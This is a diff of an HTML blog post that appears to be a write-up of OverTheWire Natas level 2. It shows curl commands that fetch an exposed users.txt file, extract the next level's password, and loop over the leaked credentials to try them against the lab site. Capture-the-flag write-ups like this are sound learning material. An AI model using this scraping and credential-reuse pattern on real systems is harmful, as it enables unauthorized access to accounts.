@@ -150,14 +150,20 @@ That was the first one where it didn&rsquo;t get solved in the first second. I n
 <p>That was the first one where it didn&rsquo;t get solved in the first second. I noticed that body contained an image /files/pixel.png. At first I tried file / strings / xxd to find the password hidden in the image, but that led me to a dead end.
 Then I though files/ is there anything else in that directory that could be useful?  Yup, I found users.txt file with usernames:passwords and here was natas3.</p>
 <p>Once again, easy.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>curl --user natas2:<span style="color:#66d9ef">$(</span>cat natas2<span style="color:#66d9ef">)</span>  http://natas2.natas.labs.overthewire.org/files
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>URL<span style="color:#f92672">=</span>http://natas2.natas.labs.overthewire.org
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>curl --user natas2:<span style="color:#66d9ef">$(</span>cat natas2<span style="color:#66d9ef">)</span> $URL 
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Saving natas3 to a file</span>
-</span></span><span style="display:flex;"><span>curl --user natas2:<span style="color:#66d9ef">$(</span>cat natas2 <span style="color:#66d9ef">)</span>  http://natas2.natas.labs.overthewire.org/files/users.txt | grep <span style="color:#e6db74">&#34;natas3&#34;</span> | sed <span style="color:#e6db74">&#34;s/.*://&#34;</span> &gt; natas3
+</span></span><span style="display:flex;"><span>curl --user natas2:<span style="color:#66d9ef">$(</span>cat natas2 <span style="color:#66d9ef">)</span> $URL<span style="color:#e6db74">&#34;/files/users.txt&#34;</span> |
+</span></span><span style="display:flex;"><span>grep <span style="color:#e6db74">&#34;natas3&#34;</span> | sed <span style="color:#e6db74">&#34;s/.*://&#34;</span> &gt; natas3
 </span></span></code></pre></div><p>Users.txt didn&rsquo;t contain only the natas3 password, but it also contained other usernames &amp; passwords. I tried to use those other credentials to access the natas2 website, but that didn&rsquo;t work :c
 Here you can see my attempt:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl --user natas2:<span style="color:#66d9ef">$(</span>cat natas2 <span style="color:#66d9ef">)</span>  http://natas2.natas.labs.overthewire.org/files/users.txt | grep -v <span style="color:#e6db74">&#34;#&#34;</span> | <span style="color:#66d9ef">while</span> IFS<span style="color:#f92672">=</span>: read -r user pass; <span style="color:#66d9ef">do</span> curl --user <span style="color:#e6db74">&#34;</span>$user<span style="color:#e6db74">:</span>$pass<span style="color:#e6db74">&#34;</span> http://natas2.natas.labs.overthewire.org &gt;&gt; hmm ;  <span style="color:#66d9ef">done</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl --user natas2:<span style="color:#66d9ef">$(</span>cat natas2 <span style="color:#66d9ef">)</span> $URL<span style="color:#e6db74">&#34;/files/users.txt&#34;</span> | 
+</span></span><span style="display:flex;"><span>grep -v <span style="color:#e6db74">&#34;#&#34;</span> | 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> IFS<span style="color:#f92672">=</span>: read -r user pass; <span style="color:#66d9ef">do</span> 
+</span></span><span style="display:flex;"><span>  curl --user <span style="color:#e6db74">&#34;</span>$user<span style="color:#e6db74">:</span>$pass<span style="color:#e6db74">&#34;</span> $URL &gt;&gt; hmm_file 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
 </span></span></code></pre></div>
         </div>
       </article>
